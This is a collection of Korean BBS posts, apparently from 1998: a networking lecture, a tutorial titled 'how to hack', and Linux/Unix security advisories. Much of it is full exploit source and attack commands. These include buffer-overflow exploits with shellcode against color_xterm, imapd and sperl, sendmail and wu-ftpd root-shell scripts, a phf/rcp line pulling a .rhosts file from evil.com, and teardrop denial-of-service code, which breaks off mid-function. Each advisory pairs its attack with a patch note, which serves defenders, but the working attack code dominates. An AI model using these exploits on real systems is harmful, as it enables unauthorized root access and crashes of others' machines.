제  목: [강좌] 게이트웨이 , 라우터 , 브릿지란?

게이트웨이(Gateway)는 일반적으로 하나의 네트워크, 혹은 울타리 안에서
밖으로 빠져나가는 중간 관문역할을 수행하는 것을 Gateway라고 합니다.
일반적으로 이야기할때, 라우터(Router)와 게이트웨이는 같은 의미로 생각하시면
문제가 없을 것입니다.

하지만, 게이트웨이가 다른 의미로 사용될 수도 있습니다.
예를 들면, WWW에서 CGI(Common Gateway Interface)같은 것은 게이트웨이의
의미가 라우터랑 다르지요.
http daemon이 인자를 받아 어떤 프로그램을 실행시켜
그 결과값을 사용하여 client에 다시 html형태로 자료를 전해주?

하여간, '일반적'인 경우에, Router와 Gateway는 같은 의미로 사용됩니다.

브릿지(Bridge)는 무엇이냐면요.
Router와 비슷하게, packet을 filtering, forwarding해 주는 역할을 수행하는
Network 장비입니다.
Router와 무엇이 다르냐고요?
Bridge는 Ethernet Address(LAN카드 ROM에 박혀있는 고유넘버)로 packet을
filtering합니다.

Router는 IP address로 packet을 filtering, forwarding합니다.

이게 무슨 의미냐?
A라는 LAN과 B라는 LAN이 브릿지로 연결되어 있다고 가정합니다.
Ethernet에서 A라는 LAN안에 있는 한 호스트가 같은 LAN안의 호스트에게
packet을 보냅니다.
그러면, 이 패킷은 B라는 LAN으로 전달될까요?


그렇지 않습니다. Ethernet은 방송(broadcasting)방식으로 packet을 보내므로
A랜안의 브릿지를 포함한 모든 호스트가 같은 패킷을 받아보지만,
브릿지는 A랜 안의 호스트가 A랜 안의 호스트로 packet을 보내는 것이므로
B랜쪽으로는 packet을 broadcasting하지 않습니다.

만일, A랜안의 호스트에서 packet을 B랜안의 호스트로 보낸다면,
먼저 호스트는 A랜안으로 packet을 broadcasting합니다.
A랜안에는 packet의 목적지가 없지요.
하지만, 이 패킷을 받아본 브릿지는 이걸 B쪽으로 broadcasting하는 겁니다.
그럼, 패킷이 전달되겠죠.

그러기 위해서는 Bridge는 두개 이상의 Network Interface를 가져야 하고요
(양쪽 랜으로 하나씩의 Interface가 있어야 하겠지요)
양쪽 LAN안의 Ethernet Address에 대한 정보를 모두 가지고 있어야 합니다.
LAN으로 연결하면 자동으로 bridge에서 이를 감지해서 정보 table을 만들지요.

브릿지(Bridge)를 사용하는 목적은 segment를 분리하기 위해 사용됩니다.
Ethernet방식의 약점은 broadcasting방식 때문에 하나의 LAN안에 너무 많은
호스트가 물려있다면, 성능이 저하되기 때문입니다.
그러므로, 하나의 랜을 두개 이상으로 쪼갤때,
즉, Bridge를 두어 같은 랜안의 packet은 바깥으로 나가지 못하게 하면
이런 단점을 극복할 수 있습니다.

Router는 Bridge와 동작원리가 같습니다.
단, packet을 무엇으로 filtering/forwarding하느냐가 다릅니다.

일반적인 router는 bridge 기능을 겸하고 있습니다.
그래서, 브라우터(brouter)라고 부르기도 하지요.

그림을 그려서 좀더 자세히 설명하면 좋으련만....
히히, 더이상 말하면 없는 실력이 들통나겠지요?  :-P


마지막으로 한마디 더,
Ethernet은 ISO 802위원회에서 제정한 802.2방식
    (CSMA/CD, Carrier Sense Multiple Access with Collision Detection)
을 사용합니다.
궁금하시면 아무거나 통신책을 보시면 친절하고 자세한 설명이
나와있을 겁니다.

 제  목: [강좌] 해킹하는 방법

이 강좌는 아주 위험한 강좌가 될 수도 있습니다.
이 강좌를 잘 이용하면 나우누리계정 서비스를 해킹 할 수도
있는 실력자(?)가 되죠.. 속이 빈 겉만 화려한 실력자요.
절대로 이것을 그대로 흉내만 내보고 그것에서 멈추세요.
더 공부를 한후에 본격적으로 하시고..

그럼 강좌 올라 갑니다.
참고로 과거에 해킹사건으로 떠들석한 해킹은 모두 이런 종류의 해킹입니다.
초보적인 수준이지요.
그럼..

해킹하는 사람들의 대부분은 이런 식으로 한답니다.
아주 보편적인 것이죠..
바로 소스 코드를 해당 호스트(해킹대상)에서 컴파일 한후 실행시키면
끝나는 거죠..
아주 쉽다구요?
그럼 그 과정을 한번 해볼까요?

[ 시작 ]

[root@loveyou lib]# telnet bbs.xxx.xx.xx
Trying 20.23.10.3...
Connected to xxxxxx.xx.kr.
Escape character is '^]'.

Welecom My host~

 ## 01:17 on Monday, 30 March 1998 (ttyp5)
login: loveyou
Password:
Last login: Mon Mar 30 00:50:04 from loveyou
[loveyou@bbs loveyou]$ ls -al /usr/bin/sperl*
-rwsr-xr-x   2 root     root       402280 Apr 22  1997 /usr/bin/sperl5.003

/* 해킹할 대상을 찾습니다.  대부분이 setuid 가 걸린 프로그램을 찾음
보세요. rws 라고 setuid가 설정되었죠?
그런후에 해당 해킹 프로그램을 가져와서 컴파일을 합니다.
보통은 ftp 로 그 소스를 가져 옵니다.  */

[loveyou@bbs loveyou]$ ftp loveyou.ml.org
Connected to loveyou.ml.org.
220 xxxxxxxx.xx.xx.xr FTP server (Version wu-2.4.2-academ[BETA-xx](1) Sat xxx xx

 xx:xx:xx KST 199x) ready.
Name (xxxxx:loveyou): loveyou
331 Password required for loveyou
Password:
230 User shade logged in.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> get hack.c
local: hack.c remote: hack.c
200 PORT command successful.
150 Opening BINARY mode data connection for hack.c (4037 bytes).
226 Transfer complete.
4037 bytes received in 1.57 secs (2.5 Kbytes/sec)
ftp> quit
[loveyou@bbs loveyou]$ cc -o hack hack.c

/* 소스를 컴파일 한다. hack 이라는 프로그램 생성 */

[loveyou@bbs loveyou]$ ./hack
Using address: 0x45c
# <- root 프롬프트 지요? 이렇게 되면 성공이에요

해킹 하기 너무 쉬워요.그렇지 않은가요?
하지만 이렇게 쉬운 해킹은 미연에 관리자들이 방지할 수 있지요..

관리자는 두가지 행동을 할 수 있습니다.
첫번째, 우선 막아둔다. chmod 700 /usr/bin/sperl*
두번째, 그 다음은 ftp 로 각 해당 리눅스 사이트나 소프트웨어 사이트로 가서
패치 파일을 가져와서 패치한다. 어떻게 할지 모른다면
그냥 첫번째만 해놓고 있어도 되고 러브유에게 자문을 구해도 된다.

^_^
여기까지에요.
재미있지요?


이런것이 해킹이에요.
과거에 나우누리 계정 서버 해킹해서 난리났던 고등학생은 이런 해킹이었죠.
너무 간단하죠?
해킹이라는 건 이정도가지고 볼 수가 없어요.
아주 일부분에 불과하니까요
하지만 이런 것을 성공했다고 우쭐대는 사람들이 많아서 좀 그렇네요.


 제  목: [강좌] 외부 특정 호스트의 접근 막기

음..어떤 호스트에서 자꾸 이상한 사람이 들어온다고 느낄땐
그 호스트의 사람만 못들어오게 하고 싶다구요?
그렇다면 방법이 있죠.
바로 유닉스,리눅스라면 기본적으로 설치되어 있는 TCP 와퍼를 이용하는
겁니다. 아~ 웬지 거창하다구여?
따악 2줄만 쓰면 됩니다.하하
/etc/hosts.deny 라는 파일이죠.. 그 파일안에
프로토콜:호스트네임
이런 형식으로 쓰면 됩니다.
그 예를 들면
ALL:soback.kornet.nm.kr
이라는 내용은 soback.kornet.nm.kr 에서 오는 모든 프로토콜의 접속을
금지 한다는 말입니다.
흐..유용하죠?
/etc/hosts.allow 라는 파일은 특정 호스트의 접속을 허가 할때 하죠.
그러니깐 음 위의 /etc/hosts.deny보단 상위의 비중을 차지 합니다.

 제  목: [보안] 리눅스 xterm,color_xterm
명령

        xrm (color_xterm, xterm, nxterm)

시스템

        Linux Slackware 3.1, RedHat 4.2

문제점

        버퍼 오버 플로우를 일으킨다.

    >-- cx.c --<

    /*
     * color_xterm   buffer    overflow   exploit   for   Linux   with
     * non-executable stack
     * Copyright (c) 1997 by Solar Designer
     *
     * 컴파일 방법:
     * gcc cx.c -o cx -L/usr/X11/lib \
     * `ldd /usr/X11/bin/color_xterm | sed -e s/^.lib/-l/ -e
s/\\\.so.\\\+//`
     *
     * 실행 :
     * $ ./cx
     * system() found at: 401553b0
     * "/bin/sh" found at: 401bfa3d
     * bash# exit (^^;)
     * Segmentation fault
     */

    #include
    #include
    #include
    #include

    #include
    #include
    #include
    #include
    #include

    #define SIZE1           1200    /* Amount of data to overflow with */
    #define ALIGNMENT1      0       /* 0..3 */
    #define OFFSET          22000   /* Structure array offset */
    #define SIZE2           16000   /* Structure array size */
    #define ALIGNMENT2      5       /* 0, 4, 1..3, 5..7 */
    #define SIZE3           SIZE2
    #define ALIGNMENT3      (ALIGNMENT2 & 3)

    #define ADDR_MASK       0xFF000000

    char buf1[SIZE1], buf2[SIZE2 + SIZE3], *buf3 = &buf2[SIZE2];

    int *ptr;

    int pid, pc, shell, step;
    int started = 0;
    jmp_buf env;

    void handler() {
      started++;
    }

    /* SIGSEGV handler, to search in libc */
    void fault() {
      if (step < 0) {
    /* Change the search direction */
        longjmp(env, 1);
      } else {
    /* The search failed in both directions */

        puts("\"/bin/sh\" not found, bad luck");
        exit(1);
      }
    }

    void error(char *fn) {
      perror(fn);
      if (pid > 0) kill(pid, SIGKILL);
      exit(1);
    }

    int nz(int value) {
      if (!(value & 0xFF)) value |= 8;
      if (!(value & 0xFF00)) value |= 0x100;

      return value;
    }

    void main() {
    /*
     * A portable way to get the stack pointer value; why do other
exploits use
     * an assembly instruction here?!
     */
      int sp = (int)&sp;

      signal(SIGUSR1, handler);

    /* Create a child process to trace */
      if ((pid = fork()) < 0) error("fork");

      if (!pid) {
    /* Send the parent a signal, so it starts tracing */
        kill(getppid(), SIGUSR1);

    /* A loop since the parent may not start tracing immediately */
        while (1) system("");
      }

    /* Wait until the child tells us the next library call will be
system() */
      while (!started);

      if (ptrace(PTRACE_ATTACH, pid, 0, 0)) error("PTRACE_ATTACH");

    /* Single step the child until it gets out of system() */
      do {
        waitpid(pid, NULL, WUNTRACED);
        pc = ptrace(PTRACE_PEEKUSR, pid, 4*EIP, 0);
        if (pc == -1) error("PTRACE_PEEKUSR");
        if (ptrace(PTRACE_SINGLESTEP, pid, 0, 0))
error("PTRACE_SINGLESTEP");

      } while ((pc & ADDR_MASK) != ((int)main & ADDR_MASK));

    /* Single step the child until it calls system() again */
      do {
        waitpid(pid, NULL, WUNTRACED);
        pc = ptrace(PTRACE_PEEKUSR, pid, 4*EIP, 0);
        if (pc == -1) error("PTRACE_PEEKUSR");
        if (ptrace(PTRACE_SINGLESTEP, pid, 0, 0))
error("PTRACE_SINGLESTEP");
      } while ((pc & ADDR_MASK) == ((int)main & ADDR_MASK));

    /* Kill the child, we don't need it any more */
      if (ptrace(PTRACE_KILL, pid, 0, 0)) error("PTRACE_KILL");
      pid = 0;

      printf("system() found at: %08x\n", pc);


    /* Let's hope there's an extra NOP if system() is 256 byte aligned */
      if (!(pc & 0xFF))
      if (*(unsigned char *)--pc != 0x90) pc = 0;

    /* There's no easy workaround for these (except for using another
function) */
      if (!(pc & 0xFF00) || !(pc & 0xFF0000) || !(pc & 0xFF000000)) {
        puts("Zero bytes in address, bad luck");
        exit(1);
      }

    /*
     * Search for a "/bin/sh" in libc until we find a copy with no zero
bytes
     * in its address. To avoid specifying the actual address that libc is
     * mmap()ed to we search from the address of system() in both
directions
    * until a SIGSEGV is generated.
     */
      if (setjmp(env)) step = 1; else step = -1;
      shell = pc;
      signal(SIGSEGV, fault);
      do
        while (memcmp((void *)shell, "/bin/sh", 8)) shell += step;
      while (!(shell & 0xFF) || !(shell & 0xFF00) || !(shell & 0xFF0000));
      signal(SIGSEGV, SIG_DFL);

      printf("\"/bin/sh\" found at: %08x\n", shell);

    /* buf1 (which we overflow with) is filled with pointers to buf2 */
      memset(buf1, 'x', ALIGNMENT1);
      ptr = (int *)(buf1 + ALIGNMENT1);
      while ((char *)ptr < buf1 + SIZE1 - sizeof(int))
        *ptr++ = nz(sp - OFFSET);           /* db */

      buf1[SIZE1 - 1] = 0;

    /* buf2 is filled with pointers to "/bin/sh" and to buf3 */
      memset(buf2, 'x', SIZE2 + SIZE3);
      ptr = (int *)(buf2 + ALIGNMENT2);
      while ((char *)ptr < buf2 + SIZE2) {
        *ptr++ = shell;                     /* db->mbstate */
        *ptr++ = nz(sp - OFFSET + SIZE2);   /* db->methods */
      }

    /* buf3 is filled with pointers to system() */
      ptr = (int *)(buf3 + ALIGNMENT3);
      while ((char *)ptr < buf3 + SIZE3 - sizeof(int))
        *ptr++ = pc;                        /* db->methods->mbfinish */
      buf3[SIZE3 - 1] = 0;

    /* Put buf2 and buf3 on the stack */

      setenv("BUFFER", buf2, 1);

    /* GetDatabase() in libX11 will do
(*db->methods->mbfinish)(db->mbstate) */
      execl("/usr/X11/bin/color_xterm", "color_xterm", "-xrm", buf1,
NULL);
      error("execl");
    }

    >-- cx.c --<

해결책

    아래에서 패치버젼을 찾아서 패치한다.

        http://www.false.com/security/linux-stack/3:50  (17줄)


 제  목: [보안] 리눅스 Ghostscript
명령

        Ghostscript

시스템

        Linux systems running Ghostscript 1.4

문제점

        고스트 스크립의 문제점은 어떤 숨겨진 코드를 이용해서 그것을 이용해
        잠시 쉘을 통해서 어떤일을 할 수 있다. 그 코드는 포스트 스크립트의
        숨겨진 비밀 코드일 것이다. 루트의 명령을 내릴 수 잇다.

문제점

        1.4 이후의 고스트 스크립트를 깔아라..

---------------------------
 번  호: 114/177       등록자: 김용준(러브유)        98/02/16 23:52  (89줄)
 제  목: [보안] 리눅스 imapd
명령

        imapd

시스템

        RedHat 4.0버젼 까지
        Slackware 3.2

문제점

        imapd데몬을 이용해서 리모트 접속 자가 루트를 얻을 수 있다.
        이는 매우 위험하며...루트패스워드 조차 바꿀 수 있다.

    /*
     * IMAPd   Linux/intel  remote   xploit  by    savage@apostols.org
     * 1997-April-05
     * Workz fine against RedHat and imapd distributed with pine
     * Special  THANKS to:  b0fh,|r00t,eepr0m,moxx,Fr4wd,Kore and  the

    * rest of ToXyn !!!
     * usage:
     *     $ (imap 0; cat) | nc victim 143
     *             |
     *             +--> usually from -1000 to 1000 ( try in steps of  100
)
     *             [ I try 0, 100 and 200 - so1o ]
     */

    #include

    char shell[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"

    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\x90\x90\x90\xeb\x3b\x5e\x89\x76\x08\x31\xed\x31\xc9\x31\xc0\x88"
    "\x6e\x07\x89\x6e\x0c\xb0\x0b\x89\xf3\x8d\x6e\x08\x89\xe9\x8d\x6e"
    "\x0c\x89\xea\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\x90\x90\x90\x90"
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
    "\xe8\xc0\xff\xff\xff/bin/sh";

    char username[1024+255];
    void main(int argc, char *argv[]) {
            int i,a;
            long val;

            if(argc>1)
                    a=atoi(argv[1]);
            else
                    a=0;

            strcpy(username,shell);

            for(i=strlen(username);i> 8;
                    username[i+2] = (val & 0x00ff0000) >> 16;
                    username[i+3] = (val & 0xff000000) >> 24;
            }

            username[ sizeof(username)-1 ] = 0;

            printf("%d LOGIN \"%s\" pass\n", sizeof(shell), username);
    }

해결책

        래드햇 4.0 사용자는 4.1로 바꾸면 패치된다.
        래드햇 2.0 사용자는 rpm -e imap를 실행시켜서 없애라
        ftp.redhat.com 에 가면 패치된것이 있으니 받아서 패치하라


 제  목: [보안] 리눅스 ircd
명령

        ircd

시스템

        Debian Linux(1.3.1)

문제점

        IRC서버의 패키지인 ircd 2.9.32-3 은 데비안 1.3.1에 포함되어 있다.

        첫째로 문제점은 /etc/ircd/ 를 읽을수 있다. 이 디렉토리에 포함된
        서버 설정 파일과 irc 설정자의 패스워드 조차 읽을 수 있도록
        퍼미션이 열려있다.

        둘째로 패키지를 설치하면 /etc/inetd.conf에 이런 한줄이 설정된다.

        ircd            stream  tcp     wait    root    /usr/sbin/ircd ircd -i

                                           ------
        위에서 보듯이 root 라고 되어 있는 부분을 irc 라고 고쳐라..
        루트는 개여하지 않는것이 원칙이다.

해결책

        Loveyou~# chmod 700 /etc/ircd/
        Loveyou~# chown irc.irc /etc/ircd/

        Loveyou~# grep ircd /etc/inetd.conf
        ircd            stream  tcp     wait    irc     /usr/sbin/ircd ircd -i
        위처럼 irc 라고 고쳐져야 한다.

---------------------------

 제  목: [보안] 리눅스 rcp (리모트)
명령

        /usr/bin/rcp

시스템

        Red  Hat  4.0  (if  user  nobody  has  UID 65535 and Slackware 3.1
        (possibly others)

문제점

        nobody의 uid가 65535일때 /usr/bin/rcp의 문제점이 나타난다.
        상대방의 서버가 NCSA httpd 서버를 쓴다면은 다음과 같은 일을 벌일 수가
        있다.
        root[11:20][504]~# su - nobody
        [nobody@slip-70-8 /]$ id
        uid=65535(nobody) gid=65535
        [nobody@slip-70-8 /]$ rcp oberheim@moe.cc.utexas.edu:brb /tmp/test
        [nobody@slip-70-8 /]$ ls -la /tmp/test

        -rw-------   1 root     65535           0 Jan 29 11:20 /tmp/test

        $ echo "+ +" > /tmp/my.rhosts
        $ echo "GET
 /cgi-bin/phf?Qalias=x%0arcp+hacker@evil.com:/tmp/my.rhosts+
        /root/.rhosts" | nc -v - 20 victim.com 80
        $ rsh -l root victim.com "/bin/sh -i"
        #


해결책

        nobody의 UID를 99 로 해두어라.

---------------------------

 제  목: [보안] 리눅스 perl 5.003
명령

        sperl5.003

적용되는 호스트

        Linux Slackware 3.1, 3.2
        래드햇 리눅스

문제점

        sperl5.003 이라는 파일을 버퍼 오버플로우를 시킬수 있다.


    #include
    #define DEFAULT_OFFSET                  640
    #define DEFAULT_BUFFER_SIZE            1600
    #define NOP                            0x90

    char shellcode[] =
      "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
      "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
      "\x80\xe8\xdc\xff\xff\xff/bin/sh";
    unsigned long get_sp(void) {
       __asm__("movl %esp,%eax");
    }

    void main(int argc, char *argv[]) {
      char *buff, *ptr;
      long *addr_ptr, addr;
      int offset=DEFAULT_OFFSET, bsize=DEFAULT_BUFFER_SIZE;
      int i;


      if (!(buff = malloc(bsize))) {
        printf("Can't allocate memory.\n");

        exit(0);
      }

      addr = get_sp() - offset;
      printf("Using address: 0x%x\n", addr);

      ptr = buff;
      addr_ptr = (long *) ptr;
      for (i = 0; i < bsize; i+=4)
        *(addr_ptr++) = addr;

      for (i = 0; i < bsize/2; i++)
        buff[i] = NOP;

      ptr = buff + ((bsize/2) - (strlen(shellcode)/2));
      for (i = 0; i < strlen(shellcode); i++)
        *(ptr++) = shellcode[i];

      buff[bsize - 1] = '\0';

      execl("/usr/bin/sperl5.003","/usr/sbin/sperl5.003",buff, NULL);
    }

해결

    sperl5.003 의 suid bit를 없애라.
    아니면 5.003_97f 의 버젼으로 바꾸어라.

---------------------------

 제  목: [보안] 리눅스 sysctl()
명령

        sysctl()

적용되는 시스템

        Linux prior to 2.0.31

문제점

        sysctl()이라는 함수에 문제가 있다. syslog flooding이 가능하며..
        오버플로우를 일으킬수 있는 보안상 문제점이 발견되었다.

    #include

    main() {
      sysctl(NULL, 0x80000000, NULL, NULL, NULL, 0);
    /* 0x80000000 can be replaced with 0xC0000000 -- both are negative,
     * and
     * produce a zero when multiplied by sizeof(int) */
    }

        이와 같은 문제점은 getgroups()라는 함수에서도 마찬가지다.
해결

        반드시 2.0.31 인 사람만 고쳐라.
        /usr/src/linux/kernel.sysctl.c 의 파일안에

            struct ctl_table_header *tmp;
            void *context;

            if (nlen == 0 || nlen >= CTL_MAXNAME) <= 이것을
            if (nlen <= 0 || nlen >= CTL_MAXNAME) <= 이렇게 고쳐라.
                    return -ENOTDIR;

            error = verify_area(VERIFY_READ,name,nlen*sizeof(int));

         그리고 다시 컴파일 시켜라. 커널 컴파일.

---------------------------

 제  목: [보안] 리눅스&유닉스 sendmail (1)
명령
        sendmail( 8.7 ~ 8.8.2)

영향있는 시스템

        센드 메일을 탑재한 모든 유닉스

문제점

        다음과 같은 간단한 스크립트로 루트를 획득할수 있다.


#/bin/sh
#
#
#                                   Hi !
#                This is exploit for sendmail smtpd bug
#    (ver. 8.7-8.8.2 for FreeBSD, Linux and may be other platforms).
#         This shell script does a root shell in /tmp directory.
#          If you have any problems with it, drop me a letter.
#                                Have fun !
#
#
#                           ----------------------
#               ---------------------------------------------
#    -----------------   Dedicated to my beautiful lady
------------------
#               ---------------------------------------------
#                           ----------------------
#
#          Leshka Zakharoff, 1996. E-mail: leshka@leshka.chuvashia.su
#
#
#
echo   'main()                                                '>>leshka.c
echo   '{                                                     '>>leshka.c
echo   '  execl("/usr/sbin/sendmail","/tmp/smtpd",0);         '>>leshka.c
echo   '}                                                     '>>leshka.c
#
#
echo   'main()                                                '>>smtpd.c
echo   '{                                                     '>>smtpd.c
echo   '  setuid(0); setgid(0);                               '>>smtpd.c
echo   '  system("cp /bin/sh /tmp;chmod a=rsx /tmp/sh");      '>>smtpd.c
echo   '}                                                     '>>smtpd.c
#
#
cc -o leshka leshka.c;cc -o /tmp/smtpd smtpd.c
./leshka
kill -HUP `ps -ax|grep /tmp/smtpd|grep -v grep|tr -d ' '|tr -cs
"[:digit:]" "\n
"|head -n 1`
rm leshka.c leshka smtpd.c /tmp/smtpd
/tmp/sh

해결책

        높은 버젼의 센드메일을 설치하는 길 밖에 없다.

---------------------------

 제  목: [보안] 리눅스&유닉스 wu-FTP
명령

        wu-FTP ( site exec )

영향있는 시스템

        wu-ftp2.x 를 깔은 모든 유닉스 버젼

문제점

        site exec 의 큰 버그로 루트 권한으로 돌아가는 ftp의 잘못된 오류로
        루트권한으로 호스트의 프로그램을 실행시킬수가 있다.

        cat > bug.c
        #include
        #include
        #include

        main()
        {
           seteuid(0);
           system("cp /bin/sh /tmp/.sh");
           system("chmod 6777 /tmp/.sh");
        }

       위의 소스를 cc -o bug bug.c 로 컴파일 후에 ftp 로 자신의 호스트에 접속
        한다.
        그 예이다.

ftp 0
220 exploitablesys FTP server (Version wu-2.4(1) Sun Jul 31 21:15:56 CDT 1994) r
eady.
Name (0:guest): guest
331 Password required for guest.
Password: (password)
230 User guest logged in.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> quote "site exec bash -c id"      (see if sys is exploitable)
200-bash -c id
200-uid=0(root) gid=0(root) euid=505(adm) egid=100(users) groups=100(users)
200  (end of 'bash -c id')
ftp> quote "site exec bash -c /home/guest/bug"
200-bash -c /home/guest/bug
200  (end of 'bash -c /home/guest/bug')
ftp> quit

        위와 같이 하면 bug라는 프로그램이 루트 권한으로 돌아가게 된다.
        그렇게 되면 /tmp 디렉토리에 루트권한의 쉘이 만들어진다.

해결

        ftp 버젼을 최신으로 맞추어라.
        2.4.2버젼이면 무난하다.
        또한 의심하는 아이디는 site 명령을 사용하지 못하게 제한을 두어라

---------------------------

 제  목: [보안] 리눅스&유닉스 sendmail (2)
명령

        sendmail 8.8.4

시스템

        센드메일 8.8.4를 운영하는 모든 시스템

문제점

        센드 메일의 잘못된 버그로 인해 /var/tmp에 dead.letter이라는 파일을
        만드는데 이는 루트의 권한이다.

        그 예

        ln -s /.rhosts /var/tmp/dead.letter
        telnet white.hacker.securi.ty 25
        mail from : security@wh.it.e.best
        rcpt to : Fuck@fuck.you.haha
        data
        dlfjs qjrmrk dlTska..
        .
        quit

        이렇게 함으로써 루트 디렉토리에 .rhosts 파일을 만들수 있다.
        이를 좀더 응용하면 패스워드 파일을 손볼수 있다.

해결책

        센드메일 을 8.8.5 이상으로 올려라.

---------------------------

 제  목: [보안] 리눅스 Lizards game
명령

        Lizards game

시스템

        슬랙웨어 3.4

문제점

        Lizards 게임은 setuid가 걸려있는 프로그램이다.
        setuid 가 걸려 있는 이유는 바로 이 게임이 svgalib를 사용하기 때문이다.
        그런데 그 게임의 소스를 보면 system(clear);라고 함수를 사용했다.
        이는 사용자의 입장으로 보면 간단히 구멍을 발견할 수 있다.
        path=. 라고 두고 clear 스크립트를 작성하여 그 clear스크립트를
        루트의 권한으로 돌릴수 있다.

해결책

        우선 그 파일의 퍼미션을 닫아두어라.

        chmod -s /usr/games/lizardlib/lizardshi

---------------------------

 제  목: [보안] 리눅스  IP fragment overlap
명령

        IP fragment overlap

시스템

        리눅스 / 윈도우 NT / 윈도우 95 / 기타 유닉스 시스템

문제점

        아래의 프로그램을 돌려서 시스템을 멈추게 할 수 있다.
 /*
     * Copyright (c) 1997 route|daemon9
     * 11.3.97
     *
     * Linux/NT/95 Overlap frag bug exploit
     *
     * Exploits the overlapping IP  fragment bug present in all  Linux
     * kernels and NT 4.0 / Windows 95 (others?)
     *
     * Based off of:   flip.c by klepto
     * Compiles on:    Linux, *BSD*
     *
     *  gcc -O2 teardrop.c -o teardrop
     *      OR
     *  gcc -O2 teardrop.c -o teardrop -DSTRANGE_BSD_BYTE_ORDERING_THING
     */

    #include
    #include
    #include
    #include
    #include
    #include
    #include
    #include
    #include
    #include
    #include

    #ifdef STRANGE_BSD_BYTE_ORDERING_THING
                            /* OpenBSD < 2.1, all FreeBSD and netBSD, BSDi < 3.0

 */
    #define FIX(n)  (n)
    #else                   /* OpenBSD 2.1, all Linux */
    #define FIX(n)  htons(n)
    #endif  /* STRANGE_BSD_BYTE_ORDERING_THING */

    #define IP_MF   0x2000  /* More IP fragment en route */
    #define IPH     0x14    /* IP header size */
    #define UDPH    0x8     /* UDP header size */
    #define PADDING 0x1c    /* datagram frame padding for first packet */
    #define MAGIC   0x3     /* Magic Fragment Constant (tm).  Should be 2 or 3 *
/
    #define COUNT   0x1     /* Linux dies with 1, NT is more stalwart and can
                             * withstand maybe 5 or 10 sometimes...  Experiment.

                             */
    void usage(u_char *);
    u_long name_resolve(u_char *);
    u_short in_cksum(u_short *, int);
    void send_frags(int, u_long, u_long, u_short, u_short);

    int main(int argc, char **argv)
    {
        int one = 1, count = 0, i, rip_sock;
        u_long  src_ip = 0, dst_ip = 0;
        u_short src_prt = 0, dst_prt = 0;
        struct in_addr addr;

        fprintf(stderr, "teardrop   route|daemon9\n\n");

        if((rip_sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
        {
            perror("raw socket");
            exit(1);
        }
        if (setsockopt(rip_sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(on
e))
            < 0)
        {
            perror("IP_HDRINCL");
            exit(1);
        }
        if (argc < 3) usage(argv[0]);
        if (!(src_ip = name_resolve(argv[1])) || !(dst_ip = name_resolve(argv[2]
)))
        {
            fprintf(stderr, "What the hell kind of IP address is that?\n");
            exit(1);
        }

        while ((i = getopt(argc, argv, "s:t:n:")) != EOF)
        {
            switch (i)
            {
                case 's':               /* source port (should be emphemeral) */

                    src_prt = (u_short)atoi(optarg);
                    break;
                case 't':               /* dest port (DNS, anyone?) */
                    dst_prt = (u_short)atoi(optarg);
                    break;
                case 'n':               /* number to send */
                    count   = atoi(optarg);
                    break;
                default :
                    usage(argv[0]);
                    break;              /* NOTREACHED */
            }
        }
        srandom((unsigned)(time((time_t)0)));
        if (!src_prt) src_prt = (random() % 0xffff);
        if (!dst_prt) dst_prt = (random() % 0xffff);
        if (!count)   count   = COUNT;

        fprintf(stderr, "Death on flaxen wings:\n");
        addr.s_addr = src_ip;
        fprintf(stderr, "From: %15s.%5d\n", inet_ntoa(addr), src_prt);
        addr.s_addr = dst_ip;
        fprintf(stderr, "  To: %15s.%5d\n", inet_ntoa(addr), dst_prt);
        fprintf(stderr, " Amt: %5d\n", count);
        fprintf(stderr, "[ ");

        for (i = 0; i < count; i++)
        {
            send_frags(rip_sock, src_ip, dst_ip, src_prt, dst_prt);
            fprintf(stderr, "b00m ");
            usleep(500);
        }
        fprintf(stderr, "]\n");
        return (0);
    }

    /*
     *  Send two IP fragments with pathological offsets.  We use an implementati
on
     *  independent way of assembling network packets that does not rely on any
of
     *  the diverse O/S specific nomenclature hinderances (well, linux vs. BSD).

     */

    void send_frags(int sock, u_long src_ip, u_long dst_ip, u_short src_prt,
                    u_short dst_prt)
    {
        u_char *packet = NULL, *p_ptr = NULL;   /* packet pointers */
        u_char byte;                            /* a byte */
        struct sockaddr_in sin;                 /* socket protocol structure */

        sin.sin_family      = AF_INET;
        sin.sin_port        = src_prt;
        sin.sin_addr.s_addr = dst_ip;

        /*
         * Grab some memory for our packet, align p_ptr to point at the beginnin
g
         * of our packet, and then fill it with zeros.
         */
        packet = (u_char *)malloc(IPH + UDPH + PADDING);
        p_ptr  = packet;
        bzero((u_char *)p_ptr, IPH + UDPH + PADDING);

        byte = 0x45;                        /* IP version and header length */
        memcpy(p_ptr, &byte, sizeof(u_char));
